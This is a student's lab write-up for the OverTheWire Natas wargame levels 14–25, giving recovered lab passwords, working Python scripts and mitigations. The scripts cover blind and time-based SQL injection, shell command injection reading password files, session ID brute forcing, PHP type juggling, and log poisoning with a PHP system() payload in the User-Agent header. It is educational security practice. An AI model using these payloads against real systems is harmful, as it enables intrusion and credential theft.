# OverTheWire Natas Project Part #2

## Student Information

* Student name: **Benjamin Greenberg**
* NetId: **bgreenb3**


## Project Description

In this project, you will be complete the Natas challenges at <https://overthewire.org/wargames/natas/>. In this part of the lab, you will complete challenges Natas 14–Natas 25. For each challenge, you will complete the following worksheet describing:
1. The credentials found in the challenge.
2. How you solved the challenge. Include any JavaScript or other scripts necessary to retrieve the credentials.
3. What sins (as found in the *24 Deadly Sins* book) are evidenced in the challenge.
4. How those sins should be addressed to address your exploit.

In the workshop, the challenges are named based on the username used to login to the shell for that challenge. For example, the challenge labeled "Natas 10" will be logged into with the username natas10, and the solution will be the credentials for the user Natas11.

You can find a basic guide for markdown formatting [here](https://www.markdownguide.org/basic-syntax/). In particular, note the [code section](https://www.markdownguide.org/basic-syntax/#code) which should be used to annotate any code or commands used in your writeup.


## Hints

For several of these challenges it will be necessary to create a script to connect to the Natas challenge and perform some number of operations. This can be done in any language. Below is an example of how this can be done in python using the requests package (`pip install requests`):

```python
req = requests.get(
    'http://natasXX.natas.labs.overthewire.org/index.php',  # URL to connect to
    cookies={},                                             # Any cookies needed in the request. Omit if not needed.
    auth=('natasXX', 'XXXXXXXXXX'))                         # Credentials for the current level
if req.status_code == 200:                                  # Request was successful
    print req.text                                          # Body of the response
```

Below are several hints for these challenges:
* Natas 15–16: Often bruteforcing all possible passwords will take too long. Is there a way to incrementally guess prefixes of the password?
* Natas 17: Are there any side channels we could use?
* Natas 25: The main page will not contain the password file. Is there another page that you can trick into including the password file? Note, this challenge requires chaining two different attacks.


## Challenges

---
### Natas 14

#### Credentials
Password: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

#### How you passed the challenge
1) I looked at the source code and noticed that it was directed putting in user input into the query
2) I injected the following sql query to login and get the password
```sql
" OR ""=" 
```

#### What sins are evidenced in this challenge
Sin #1, Sin #12

#### How could those sins be mitigated
Don't trust user input
Use parameterized queries
Don't expose authentication systems


---
### Natas 15

#### Credentials
Password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

#### How you passed the challenge
1) After looking at the source code and noticing that there was no direct way to find the password, I managed to figure out that a user will be returned in the query is injected with a valid user and a password comparison using SQL's ```LIKE``` operator
2) I wrote a script to brute-force the password by using Python's ```request``` library
3) When the password I was getting wasn't working, I realized that all the alpha characters in my generated password were lowercase, so I found that SQL's ```BINARY``` operator could be used to force case-sensitive comparisons
```python
import requests

alnums = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
passwd = ""
auth = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

for i in range(len(auth[1])):
    for char in alnums:
        query = f'natas16" AND password LIKE BINARY "{passwd}{char}%'
        # print(query)
        req = requests.get(f'http://natas15.natas.labs.overthewire.org/index.php?username={query}',
                           auth=auth
                           )
        if "This user exists" in req.text:
            passwd += char
            break

print(passwd)
```

#### What sins are evidenced in this challenge
Sin #1, Sin #12

#### How could those sins be mitigated
Don't trust user input
Use parametrized queries


---
### Natas 16

#### Credentials
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

#### How you passed the challenge
1) I followed a similar pattern to Natas 15, except instead of looking for a certain string, I looked for when a certain string was not on the page
2) I used grep with ```^<chars>``` to incrementally build the password one character at a time
3) If the password existed with the current set of characters, then the random word from the dictionary would not show up 
```natas16.py```
```py
import requests

alnums = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
passwd = ""
auth = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

for i in range(len(auth[1])):
    for char in alnums:
        string = f'(grep ^{passwd}{char} /etc/natas_webpass/natas17)'
        req = requests.get(f'http://natas16.natas.labs.overthewire.org/index.php?needle=supercomputers${string}',
                           auth=auth
                           )
        if "supercomputers" not in req.text:
            passwd += char
            print(passwd)
            break


print(passwd)
```

#### What sins are evidenced in this challenge
Sin #10, Sin #12, Sin #17

#### How could those sins be mitigated
Don't directly input user input into system calls
Don't just rely on simple blacklists for sanitization, use proper input validation


---
### Natas 17

#### Credentials
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

#### How you passed the challenge
1) Similar to Natas 15, I used brute force blind SQL injection to get the password
2) First I tried sleeping, but soon realized that I needed to POST the data instead of GET for the SQL to be properly injected
3) In the script, I tell the query to sleep for 15 seconds and give the request a timeout of 2 seconds
4) If the request throws a timeout exception, then the current character is part of the password

```natas17.py```
```py
import requests

alnums = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
passwd = ""
auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

for i in range(len(auth[1])):
    for char in alnums:
        data = {
            "username": f'natas18" AND password LIKE BINARY "{passwd}{char}%" AND SLEEP(15) #'}
        # print(data["username"])
        try:
            req = requests.post(f'http://natas17.natas.labs.overthewire.org/index.php',
                                auth=auth, data=data, timeout=2
                                )
        except requests.exceptions.Timeout:
            passwd += char
            print("Passwd", passwd)
            break

print("Final Passwd", passwd)
```

#### What sins are evidenced in this challenge
Sin #1, Sin #12

#### How could those sins be mitigated
Don't trust user input
Use parametrized queries


---
### Natas 18

#### Credentials
Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

#### How you passed the challenge
Since there were only 640 possible session IDs and I didn't know which ones were admins, I wrote a script to loop through the IDs with the ```admin``` cookie set to ```1```
```natas18.py```
```py
import requests

auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for i in range(1, 640):
    s = requests.Session()
    s.auth = auth
    req = s.get("http://natas18.natas.labs.overthewire.org/index.php",
                cookies={"admin": "1", "PHPSESSID": f"{i}"})
    print(i)
    if "You are an admin." in req.text:
        results = req.text.split()
        print(results[results.index("Password:") + 1])
        break
```

#### What sins are evidenced in this challenge
Sin #4, Sin #12

#### How could those sins be mitigated
Use 128-bit+ Session IDs 
Use encrypted session IDs with a proper expiration date
Use internal tracking to tell which users are admins

---
### Natas 19

#### Credentials
Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF

#### How you passed the challenge
1) I had no idea what the session ID was so I printed out a bunch of them with Python before noticing that the start and last 2 digits always remained the same
2) When I added a username, I noticed that some stuff got appened onto the end of the string that also remained constant
3) I used the BURP suite to test decoding with a few different options before finding that the session IDs were just the hex representations of the ASCII values of a session ID appended with "-" and some username
4) After trying a few different usernames, I went with admin using the script below
5) The admin session ID I found was "281-admin"

```natas19.py```
```py
import requests

# data = {"username": "natas19", "password": "2334"}
auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
username = "-admin"
s_string = "".join("{}".format(hex(ord(c)), 'x') for c in username)

# while True:
# req = requests.post(
#     "http://natas19.natas.labs.overthewire.org/index.php", data=data, auth=auth)
# print(req.cookies.get_dict()["PHPSESSID"])

for i in range(1, 641):
    number = "".join("{}".format(hex(ord(c)), 'x') for c in str(i))
    s_id = number + s_string
    s_id = s_id.replace("0x", "")
    print(i)

    s = requests.Session()
    s.auth = auth
    req = s.get("http://natas19.natas.labs.overthewire.org/index.php",
                cookies={"PHPSESSID": s_id, "admin": "1"})

    if "You are an admin." in req.text:
        results = req.text.split()
        print(results[results.index("Password:") + 1])
        break
```

#### What sins are evidenced in this challenge
Sin #4, Sin #12, Sin #21

#### How could those sins be mitigated
Use 128-bit+ Session IDs 
Use unpredictable session IDs
Use encrypted session IDs with a proper expiration date
Use internal tracking to tell which users are admins



---
### Natas 20

#### Credentials
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ

#### How you passed the challenge
1) I looked in the source code and saw that the custom session handler only had my_read and my_write
2) I saw that my_write puts all alphanumeric chars into a file based off of the session ID 
3) I also saw that my_read will parse the name, then any line after will be split based on spaces and the first two items will be set to key=val respectively in the session.
4) I wrote the following script to input a name followed by ```\n admin 1```, get the session ID, then call a get request with the admin-based session ID to get the password
```natas20.py```
```py
import requests

auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')

data = {"name": "\nadmin  1"}

req = requests.post("http://natas20.natas.labs.overthewire.org/index.php",
                    data=data, auth=auth)
session_ID = req.cookies.get_dict()

s = requests.Session()
s.auth = auth
req = s.get("http://natas20.natas.labs.overthewire.org/index.php",
            cookies=session_ID, auth=auth)

results = req.text.split()
print(results[results.index("Password:") + 1])
```

#### What sins are evidenced in this challenge
Sin #2, Sin #12

#### How could those sins be mitigated
Don't expose your custom session handlers
Validate user input
Use proper admin verification separate from session ID



---
### Natas 21

#### Credentials
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ

#### How you passed the challenge
1) Since there was a connected page, I figured this would be related to a CSRF attack
2) I looked at the source code of the second page and noticed that it would add every key pair to the session regardless of the whitelist in the page if ```submit``` was one of the keys in the POST request's data
3) I added ```submit=""``` and ```admin=1``` to the post request to the experimenter website
4) I set the ```PHPSESSID``` to the cookie from the post request and forwarded that cookie to the main natas21 webpage to get the password
```natas21,py```
```py

import requests

auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

data = {"submit": "", "color": "green", "admin": "1"}

s = requests.Session()
s.auth = auth
req = s.post("http://natas21-experimenter.natas.labs.overthewire.org/index.php",
             data=data)
session_ID = req.cookies.get_dict()
print(session_ID)

req = s.get("http://natas21.natas.labs.overthewire.org/index.php",
            cookies=session_ID)

results = req.text.split()
print(results[results.index("Password:") + 1])
```

#### What sins are evidenced in this challenge
Sin #2, Sin #12

#### How could those sins be mitigated
Use anti forgery tokens or SameSite cookie attributes
Properly validate all information coming in (use whitelist everywhere information is set)


---
### Natas 22

#### Credentials
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE

#### How you passed the challenge
1) I looked in the code and saw that the page will display the password as long as ```revelio``` is in the GET request
2) To prevent the page from redirecting before I can get the password, I set ```allow_redirects=False``` to get the password
```natas22.py```
```py
import requests

auth = ('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')

req = requests.get(
    "http://natas22.natas.labs.overthewire.org/index.php?revelio", auth=auth, allow_redirects=False)

results = req.text.split()
print(results[results.index("Password:") + 1])
```

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't rely on redirection to hide sensitive information


---
### Natas 23

#### Credentials
Password: OsRmXFguozKpTZZ5X14zNO43379LZveg

#### How you passed the challenge
1) Looked at the source code and saw that the only requirements were that the password contain the string ```iloveyou``` and be 10 characters or more
2) I used ```42iloveyou``` due to the fact that PHP ignores all characters other than "e", "E", or ".", so it looks at the number at the front but ignores the rest of the characters, so it sees the string "iloveyou" and the number "42" that is greater than 10 and gives the password

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Be careful about implicit conversions 
Don't expose authentication schemes


---
### Natas 24

#### Credentials
Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c

#### How you passed the challenge
1) I looked for strcmp() vulnerabilities and found that strcmp will return 0 in some cases where it fails
2) I submitted ```passwd``` with a POST request as an array with the only value being 42
3) The array caused strcmp to fail and the website to give me the password

#### What sins are evidenced in this challenge
Sin #12

#### How could those sins be mitigated
Don't rely on string comparison for authentication



---
### Natas 25

#### Credentials
Password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T

#### How you passed the challenge
1) At first I tried traversing to the password file before realizing that even after getting past the '../' replacement, the file inclusion check will remove 'natas_webpass', rendering direct LFI useless
2) I noticed that the User Agent was directly included into the PHP script, so I tried a few commands before landing on using the ```system``` call to cat ```/etc/natas_webpass/natas26```
3) I saw that later on that the script directly puts any output into the log file based on the PHPSESSID, so I set the lang to the location of the log file in order to output the contents of the log file with the password
```natas25.py```
```py
import requests

auth = ('natas25', 'GHF6X7YwACaYYssHVY05cFq83hRktl4c')
s = requests.Session()
s.auth = auth

data = {'lang': 'en'}

req = s.post(
    "http://natas25.natas.labs.overthewire.org/index.php",  data=data)
session_ID = req.cookies.get_dict()

data = {
    'lang': f'....//logs/natas25_{session_ID["PHPSESSID"]}.log'}
headers = {
    'User-Agent': '<?php system("cat /etc/natas_webpass/natas26"); ?>'}

req = s.post('http://natas25.natas.labs.overthewire.org/index.php',
             headers=headers, data=data)

print(req.text)
```

#### What sins are evidenced in this challenge
Sin #3, Sin #10, Sin #12, Sin #17

#### How could those sins be mitigated
Properly validate user input
Use non-executable user agent
Don't build DOM elements based on direct user input
Properly protect password files (Principle of least privilege)

